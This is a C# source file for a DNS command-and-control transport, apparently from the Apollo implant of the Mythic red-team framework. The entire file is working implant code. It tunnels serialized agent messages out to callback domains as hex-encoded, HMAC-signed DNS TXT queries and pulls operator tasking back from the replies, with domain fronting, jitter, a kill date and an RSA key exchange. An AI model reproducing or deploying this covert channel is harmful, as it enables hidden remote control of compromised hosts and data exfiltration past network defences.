using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Types.Delegates;
using System.Net;
using System.IO;
using System.Security.Cryptography;
using System.Threading;
using ApolloInterop.Enums.ApolloEnums;
using DnsClient;
using System.Globalization;
using System.Threading.Tasks;

namespace DnsTransport
{
    public class DnsProfile : C2Profile, IC2Profile
    {
        private int CallbackInterval;
        private double CallbackJitter;
        private string CallbackDomains;
        private string DomainFront;
        private string MsgInit;
        private string MsgDefault;
        // synthesis of CallbackHost, CallbackPort, PostUri

        private bool EncryptedExchangeCheck;
        private string KillDate;

        //private int channel = 0;
        //private int bit_flip = 0;
        //private int sequence = 0;
        private HMACMD5 hmacmd5;
        private LookupClient client;
        // synthesis of ProxyHost and ProxyPort
        private string ProxyAddress;
        private Dictionary<string, string> _additionalHeaders = new Dictionary<string, string>();
        private bool _uuidNegotiated = false;
        private RSAKeyGenerator rsa = null;

        public DnsProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
        {
            //client = new LookupClient(IPAddress.Parse("34.41.225.176"));
            client = new LookupClient(IPAddress.Parse("127.0.0.1"));
            client.UseCache = false;
            client.Timeout = new TimeSpan(0,0,10);
            hmacmd5 = new HMACMD5(Encoding.UTF8.GetBytes(data["hmac_key"]));
            CallbackInterval = int.Parse(data["callback_interval"]);
            CallbackJitter = double.Parse(data["callback_jitter"]);
            
            CallbackDomains = data["callback_domains"];
            DomainFront = data["domain_front"];
            MsgInit = data["msginit"];
            MsgDefault = data["msgdefault"];
            EncryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
            KillDate = data["killdate"];

            rsa = agent.GetApi().NewRSAKeyPair(4096);
            

            string[] reservedStrings = new[]
            {
                "callback_interval",
                "callback_jitter",
                "callback_domains",
                "encrypted_exchange_check",
                "domain_front",
                "msginit",
                "msgdefault",
                "hmac_key",
                "killdate",
            };
            
            foreach(string k in data.Keys)
            {
                if (!reservedStrings.Contains(k))
                {
                    _additionalHeaders.Add(k, data[k]);
                }
            }

            Agent.SetSleep(CallbackInterval, CallbackJitter);
        }

        public void Start()
        {
            bool first = true;
            while(Agent.IsAlive())
            {
                bool bRet = GetTasking(delegate (MessageResponse resp)
                {
                    return Agent.GetTaskManager().ProcessMessageResponse(resp);
                });

                if (!bRet)
                {
                    break;
                }

                Agent.Sleep();
            }
        }

        private bool GetTasking(OnResponse<MessageResponse> onResp)
        {
            return Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage msg)
            {
                return SendRecv<TaskingMessage, MessageResponse>(msg, onResp);
            });
        }

        public bool IsOneWay()
        {
            return false;
        }

        public bool Send<T>(T message)
        {
            throw new Exception("DnsProfile does not support Send only.");
        }

        public bool Recv<T>(OnResponse<T> onResponse)
        {
            throw new Exception("DnsProfile does not support Recv only.");
        }

        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp)
        {
            throw new NotImplementedException("DnsProfile does not support Recv only.");
        }

        public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
        {
            // Start with initial request to DNS to create a channel
            var initReply = InitConnection();
            int channel = int.Parse(initReply[0], NumberStyles.HexNumber);
            int bit_flip = 1; // Agent send message
            int sequence = int.Parse(initReply[2], NumberStyles.HexNumber);

            string sMsg = Serializer.Serialize(message);
            //string[] sMsg = Serializer.SerializeDNSMessage(message);
            int blockSize = 50;
            string sHexMsg = string.Concat(sMsg.Select(c => ((int)c).ToString("x2")));
            int numOfChunks = (sHexMsg.Length / blockSize) + 1;
            List<string> chunks = Enumerable.Range(0, numOfChunks)
                .Select(i => sHexMsg.Substring(i * blockSize, Math.Min(blockSize, sHexMsg.Length - i * blockSize)))
                .ToList();

            try
            {
                List<Task<IDnsQueryResponse>> queryRequests = new List<Task<IDnsQueryResponse>> { };
                // Send message
                foreach(string chunk in chunks)
                {
                    //Task<IDnsQueryResponse> task = client.QueryAsync(ConstructQuery(
                    //        channel,
                    //        bit_flip,
                    //        sequence,
                    //        MsgDefault,
                    //        chunk,
                    //        CallbackDomains
                    //    ),
                    //QueryType.TXT);
                    //queryRequests.Add(task);
                    var responses = client.Query(
                        ConstructQuery(
                            channel,
                            bit_flip,
                            sequence,
                            MsgDefault,
                            chunk,
                            CallbackDomains
                        ),
                    QueryType.TXT);
                    sequence += 1;
                }
                //Task<IDnsQueryResponse>.WaitAll(queryRequests.ToArray());

                // Ask for reply
                bit_flip = 2;
                var responsess = client.Query(
                    ConstructQuery(
                        channel,
                        bit_flip,
                        sequence,
                        MsgDefault,
                        "get",
                        CallbackDomains
                        ),
                    QueryType.TXT
                    );
                // Get reply
                string[] dnsReply = { };
                foreach (var item in responsess.Answers.TxtRecords())
                {
                    dnsReply = ParseReply(item.EscapedText.ToList()[0]);
                }
                int receiveChunks = int.Parse(dnsReply[3], NumberStyles.HexNumber);
                sequence = int.Parse(dnsReply[2], NumberStyles.HexNumber);
                bit_flip = int.Parse(dnsReply[1], NumberStyles.HexNumber);
                string fullMsgHex = "";
                queryRequests.Clear();
                for (int i =0; i<receiveChunks+1; i++)
                {
                    queryRequests.Add(client.QueryAsync(
                        ConstructQuery(
                            channel,
                            bit_flip,
                            sequence,
                            MsgDefault,
                            "get",
                            CallbackDomains
                            ),
                        QueryType.TXT
                    ));
                    sequence += 1;
                }
                Task<IDnsQueryResponse>.WaitAll(queryRequests.ToArray());
                foreach(var request in queryRequests)
                {
                    foreach (var item in request.Result.Answers.TxtRecords())
                    {
                        dnsReply = ParseReply(item.EscapedText.ToList()[0]);
                    }
                    if (int.Parse(dnsReply[1], NumberStyles.HexNumber) == 4)
                    {
                        bit_flip = 4;
                        // Finish receiving need to reset
                        responsess = client.Query(
                            ConstructQuery(
                                channel,
                                bit_flip,
                                sequence,
                                MsgDefault,
                                "get",
                                CallbackDomains
                                ),
                            QueryType.TXT
                        );
                        foreach (var item in responsess.Answers.TxtRecords())
                        {
                            dnsReply = ParseReply(item.EscapedText.ToList()[0]);
                        }
                        sequence = int.Parse(dnsReply[2], NumberStyles.HexNumber);
                        bit_flip = 1;
                    }
                    else
                    {
                        fullMsgHex += dnsReply[3];
                    }
                }
                
                
                string fullMsg = new string(Enumerable.Range(0, fullMsgHex.Length / 2).Select(i => (char)Convert.ToInt32(fullMsgHex.Substring(i * 2, 2), 16)).ToArray());
                onResponse(Serializer.Deserialize<TResult>(fullMsg));
                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        // Only really used for bind servers so this returns empty
        public bool Connect()
        {
            return true;
        }

        public bool IsConnected()
        {
            return Connected;
        }
        
        private string ConstructTSID(int channel, int bit_flip, int sequence)
        {
            return string.Format("{0:x2}{1:x1}{2:x6}", channel, bit_flip, sequence);
        }

        private string ConstructQuery(int channel, int bit_flip, int sequence, string type, string data, string domain)
        {
            var tsid = ConstructTSID(channel, bit_flip, sequence);
            var hash = hmacmd5.ComputeHash(Encoding.UTF8.GetBytes(tsid + data));
            var lowerHash = BitConverter.ToString(hash).Replace("-", "").ToLower();
            //if (type == "init")
            //    return string.Format("{0}.{1}.{2}.{3}", type, tsid, data, hash, domain);
            return string.Format("{0}.{1}.{2}.{3}.{4}", type, tsid, data, lowerHash, domain);
        }
        private string[] ParseReply(string reply)
        {
            var fields = reply.Split('.');
            var tsid = fields[0];

            //var channel = int.Parse(tsid.Substring(0, 2), NumberStyles.HexNumber);
            //var sequence = int.Parse(tsid.Substring(2, 6), NumberStyles.HexNumber);
            //var bitFlip = int.Parse(fields[1], NumberStyles.HexNumber);
            var channel = tsid.Substring(0, 2);
            var sequence = tsid.Substring(2, 6);
            var bitFlip = fields[1];
            var data = fields[2];

            return new string[] {channel, bitFlip, sequence, data};
        }

        private string[] InitConnection()
        {
            var data = "init";
            //var q = new DnsQuestion("somedata.local", QueryType.TXT, QueryClass.IN);
            var response = client.Query(
                ConstructQuery(
                    0,
                    0,
                    0,
                    MsgInit,
                    data,
                    CallbackDomains
                ),
                QueryType.TXT);
            string[] initReply= { };
            foreach (var item in response.Answers.TxtRecords())
            {
                initReply = ParseReply(item.EscapedText.ToList()[0]);
            }
            return initReply;
            //channel = int.Parse(initReply[0], NumberStyles.HexNumber);
            //bit_flip = 1;
            //sequence = int.Parse(initReply[2], NumberStyles.HexNumber);
            //return true;
        }

        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
        {

             if (EncryptedExchangeCheck && !_uuidNegotiated)
            {
                EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
                {
                    Action = "staging_rsa",
                    PublicKey = this.rsa.ExportPublicKey(),
                    SessionID = this.rsa.SessionId
                };

                if (!SendRecv<EKEHandshakeMessage, EKEHandshakeResponse>(handshake1, delegate(EKEHandshakeResponse respHandshake)
                {
                    byte[] tmpKey = this.rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                    ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                    ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
                    return true;
                }))
                {
                    return false;
                }
            }
            string msg = Serializer.Serialize(checkinMsg);
            return SendRecv<CheckinMessage, MessageResponse>(checkinMsg, delegate (MessageResponse mResp)
            {
                Connected = true;
                if (!_uuidNegotiated)
                {
                    ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
                    _uuidNegotiated = true;
                }
                return onResp(mResp);
            });
        }

    }
}
